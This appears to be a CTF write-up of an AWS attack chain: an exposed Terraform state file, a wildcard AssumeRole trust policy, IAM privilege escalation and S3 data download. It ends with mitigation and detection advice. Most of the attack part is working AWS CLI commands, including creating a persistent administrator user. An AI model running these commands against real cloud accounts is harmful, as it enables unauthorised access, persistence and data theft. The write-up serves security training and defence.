# Terraform tfstate OIDC Wildcard AssumeRole to S3

## Chain Summary
**Entry Point:** tfstate Information Disclosure  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/defcon-cloud-village-2025/orion

Exploits exposed Terraform Cloud state file containing OIDC identity provider configuration with wildcard trust relationships. Misconfigured wildcard `*` in the AssumeRole policy allows any principal to assume the role, bypassing OIDC validation. Results in IAM privilege escalation, user creation, policy attachment, and S3 flag exfiltration.

---

## Chain: tfstate Disclosure → OIDC Wildcard AssumeRole → IAM PrivEsc → S3 Exfil

### [1] tfstate Information Disclosure
- **Trigger:** Unauthenticated web server exposes `/terraform/terraform.tfstate` or similar path
- **Prereq:** HTTP access to web application; no authentication required
- **Method:** `curl -s http://target/terraform/terraform.tfstate | jq .` — extract Terraform state (provider config, resource definitions, outputs)
- **Yields:** Full tfstate JSON including OIDC provider `arn:aws:iam::<ACCOUNT>:oidc-provider/<OIDC_HOST>`, role name, and AssumeRole policy document

### [2] OIDC Configuration Analysis (Wildcard Detection)
- **Trigger:** AssumeRole policy JSON in tfstate contains `Principal: { "Federated": "*" }` or `"AWS": "*"` (not properly scoped to OIDC thumbprint)
- **Prereq:** Parsed tfstate in hand; understanding of IAM AssumeRole policy syntax
- **Method:** Inspect `aws_iam_role.assume_role_policy` field for overpermissive principal (wildcard instead of OIDC ARN)
- **Yields:** Confirmation that the role trusts any principal matching the federation condition (or has no condition at all)

### [3] Wildcard AssumeRole Attack
- **Trigger:** OIDC role allows unrestricted assumption (wildcard principal)
- **Prereq:** AWS CLI configured with **any valid AWS credentials** (attacker's own account); role ARN from tfstate; knowledge of wildcard OIDC misconfiguration
- **Method:**
  ```bash
  # Attempt to assume the role with a fabricated OIDC token (or no token, if policy is overpermissive)
  aws sts assume-role \
    --role-arn "arn:aws:iam::<ACCOUNT>:role/<ROLE_NAME>" \
    --role-session-name "attacker-session" \
    --duration-seconds 3600
  
  # If wildcard is truly unrestricted, this succeeds despite attacker's creds not matching OIDC conditions
  ```
- **Yields:** Temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken) for the target role with assumed permissions

### [4] Enumerate Assumed Role Permissions
- **Trigger:** Successfully assumed role; need to determine what actions are available
- **Prereq:** Valid temporary credentials from step 3
- **Method:**
  ```bash
  export AWS_ACCESS_KEY_ID="<AccessKeyId>"
  export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
  export AWS_SESSION_TOKEN="<SessionToken>"
  
  # Test IAM permissions
  aws iam get-user 2>&1  # May fail or succeed depending on attached policies
  aws s3 ls  # List available S3 buckets
  aws iam list-attached-role-policies --role-name <ROLE_NAME>  # Enum role policies (if iam:GetRole allowed)
  ```
- **Yields:** Confirmation of role's capabilities (S3 read, IAM modify, etc.)

### [5] IAM User Creation + Policy Attachment (PrivEsc)
- **Trigger:** Assumed role has `iam:CreateUser` + `iam:AttachUserPolicy` or similar
- **Prereq:** Temporary credentials from step 3; role has overprivileged IAM permissions
- **Method:**
  ```bash
  # Create new IAM user (persistence)
  aws iam create-user --user-name attacker-user
  
  # Attach AdministratorAccess policy to new user
  aws iam attach-user-policy \
    --user-name attacker-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  
  # Create access key for persistence
  aws iam create-access-key --user-name attacker-user
  # Use returned AccessKeyId + SecretAccessKey for long-term access (no session expiry)
  ```
- **Yields:** Persistent IAM user credentials with administrator permissions on the target AWS account

### [6] S3 Flag Exfiltration
- **Trigger:** Admin credentials obtained; target flag known to be in S3
- **Prereq:** Admin IAM credentials or assumed role with S3 read perms; bucket name/prefix known from tfstate or enumeration
- **Method:**
  ```bash
  # List all S3 buckets
  aws s3 ls
  
  # List bucket contents
  aws s3 ls s3://<BUCKET_NAME>/ --recursive
  
  # Download flag
  aws s3 cp s3://<BUCKET_NAME>/flag.txt ./
  cat flag.txt
  ```
- **Yields:** Flag / sensitive data from S3

---

## Mitigation & Detection

**Prevention:**
- Never expose tfstate files to unauthenticated endpoints
- Store tfstate in Terraform Cloud / S3 with encryption + MFA delete
- Scope OIDC trust to **specific thumbprints and audiences**, never use wildcard principals
- Use `aws:PrincipalOrgID` condition to restrict cross-account access
- Apply least-privilege IAM policies (no `iam:*` or `s3:*`)

**Detection:**
- Monitor S3 for unexpected `.tfstate` downloads or web exposure
- Alert on AssumeRole calls from unexpected principals
- CloudTrail logging of sts:AssumeRole with mismatched OIDC conditions
- IAM Access Analyzer flagging overpermissive role trust policies

---

## References
- AWS IAM OIDC Providers: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc.html
- AssumeRole Policy Security Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_manage_trust-policy.html
